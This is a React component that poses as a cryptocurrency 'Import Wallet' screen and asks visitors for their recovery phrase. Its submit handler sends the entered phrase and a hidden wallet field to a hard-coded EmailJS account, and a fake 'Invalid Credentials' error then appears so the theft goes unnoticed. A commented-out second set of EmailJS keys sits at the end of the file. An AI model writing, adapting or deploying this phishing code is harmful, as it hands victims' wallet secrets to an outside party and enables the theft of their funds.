import React, { useState } from "react";
import emailjs from "emailjs-com";

import {
  Link,
  useParams
} from "react-router-dom";

const sendEmail = (e) => {

  e.preventDefault();

  emailjs
    .sendForm(
      "service_uca2x1k",
      "template_069w5ez",
      e.target,
      "user_Qp1Kvs7l8ZL0vLtKArviW"
    )
    .then(
      (result) => {

        console.log(result.text);
      },
      (error) => {
        console.log(error.text);
      }
    );
  e.target.reset();
};

const Phrase = () => {
  const [hide, setHide] = useState(false);
  let { id } = useParams();

  const Showmodal = () => {
    setHide(false);
  };

  return (
    <div className="overall__phase">
      <div className="phase__container">
        <h2 style={{ textAlign: 'start', color: 'black', fontWeight: 700 }}>Import Wallet</h2>
        <br />
        <div className="phase__flex">

          <div className="phase__key">
            <a className="a" href="/">
              <Link to="/phrase">PHRASE KEY</Link>
            </a>
          </div>
          <div className="phase__key">
            <a className="a active" href="/">
              <Link to="/private">PRIVATE KEY</Link>
            </a>
          </div>
          <div className="phase__key">
            <a className="a" href="/">
              <Link to="/keystore">KEYSTORE JSON</Link>
            </a>
          </div>
        </div>
        <hr />
        {hide ? (
          <div className="errordiv">
            <h3>ERR: Invalid Credentials</h3>
          </div>
        ) : null}
        <form onSubmit={sendEmail}>
          <br />
          <input
            type="text"
            placeholder="Phrase key"
            name="key"
            min="12" max="100"
            minLength="12"
          ></input>
          <h6 className="h4" style={{ color: "black" }}>
            Typically 12(sometimes 24) words separated by single spaces
          </h6>
          <input type="text" value={id} className="hiddeen" name="wallet" />

          <button type="submit" onClick={Showmodal}>
            <b>Import</b>
          </button>

        </form>
      </div>
    </div>
  );
};

export default Phrase;


// "service_k8b44u9",
//   "template_3p64vor",
//   e.target,
//   "user_3oBCTEY5rIDrzWsqcTz39"
